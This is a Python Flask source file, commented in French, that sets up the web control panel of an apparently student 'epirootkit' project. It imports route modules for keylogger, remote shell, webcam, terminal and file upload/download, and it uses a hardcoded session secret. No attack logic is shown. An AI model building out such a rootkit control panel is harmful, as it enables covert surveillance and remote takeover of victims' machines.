import os
from flask import Flask, redirect, url_for, render_template, session
import config as cfg

# ------------------------------ FLASK SETUP -------------------------------- #

app = Flask(__name__)
app.secret_key = "epirootkit_secret"  # nécessaire pour utiliser session
app.config['UPLOAD_FOLDER'] = cfg.UPLOAD_FOLDER

# Crée les dossiers si absents
os.makedirs(cfg.UPLOAD_FOLDER, exist_ok=True)
os.makedirs(cfg.DOWNLOAD_FOLDER, exist_ok=True)

# ------------------------------- ROUTES ------------------------------------ #

@app.route('/')
def login():
    # ✅ vérifie si l'utilisateur est déjà authentifié via la session
    if session.get('authenticated'):
        return redirect(url_for('dashboard'))
    return render_template("login.html")  # page de login classique

# --------------------------- IMPORT DES ROUTES --------------------------- #

from routes import auth
from routes import dashboard
from routes import terminal
from routes import keylogger
from routes import shell
from routes import webcam
from routes import upload
from routes import download
from routes import history